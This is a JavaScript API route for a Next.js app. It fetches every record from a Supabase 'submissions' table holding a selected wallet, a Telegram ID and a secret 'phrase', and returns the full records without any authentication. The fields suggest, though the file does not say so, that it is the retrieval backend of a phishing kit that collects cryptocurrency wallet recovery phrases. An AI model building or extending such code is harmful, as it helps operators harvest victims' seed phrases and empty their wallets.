import { supabase, TABLES } from '../../../lib/supabase'

export async function GET() {
  try {
    console.log('🔄 Fetching submissions from Supabase...')
    console.log('🔑 Supabase URL:', process.env.NEXT_PUBLIC_SUPABASE_URL ? '✅ Set' : '❌ Missing')
    console.log('🔑 Supabase Key:', process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? '✅ Set' : '❌ Missing')
    console.log('📊 Table name:', TABLES.SUBMISSIONS)
    
    // Test connection first
    const { data: testData, error: testError } = await supabase
      .from(TABLES.SUBMISSIONS)
      .select('count')
      .limit(1)
    
    if (testError) {
      console.error('❌ Supabase connection test failed:', testError)
      return Response.json(
        { error: 'Database connection failed', details: testError.message },
        { status: 500 }
      )
    }
    
    console.log('✅ Database connection successful')
    
    // Fetch all submissions
    const { data: submissions, error } = await supabase
      .from(TABLES.SUBMISSIONS)
      .select('*')
      .order('timestamp', { ascending: false })

    if (error) {
      console.error('❌ Supabase query error:', error)
      return Response.json(
        { error: 'Failed to read submissions', details: error.message },
        { status: 500 }
      )
    }

    console.log('✅ Submissions fetched successfully:', submissions?.length || 0, 'records')
    
    if (submissions && submissions.length > 0) {
      console.log('📝 Latest submission:', {
        id: submissions[0].id,
        wallet: submissions[0].selected_wallet || submissions[0].selectedWallet,
        timestamp: submissions[0].timestamp,
        telegram_id: submissions[0].telegram_id,
        phraseLength: submissions[0].phrase?.length || 0
      })
      
      // Log first few submissions for debugging
      submissions.slice(0, 3).forEach((sub, index) => {
        console.log(`📝 Sample submission ${index + 1}:`, {
          id: sub.id,
          wallet: sub.selected_wallet,
          timestamp: sub.timestamp,
          phraseLength: sub.phrase?.length || 0
        })
      })
    } else {
      console.log('⚠️ No submissions found in database')
    }
    
    const response = { 
      submissions: submissions || [],
      count: submissions?.length || 0,
      lastUpdated: new Date().toISOString(),
      debug: {
        tableName: TABLES.SUBMISSIONS,
        connectionStatus: 'success',
        queryTime: new Date().toISOString()
      }
    }
    
    console.log('📤 Sending response:', response)
    return Response.json(response)
    
  } catch (error) {
    console.error('❌ Critical error reading submissions:', error)
    console.error('Error details:', {
      message: error.message,
      name: error.name,
      stack: error.stack
    })
    return Response.json(
      { error: 'Failed to read submissions', details: error.message },
      { status: 500 }
    )
  }
}

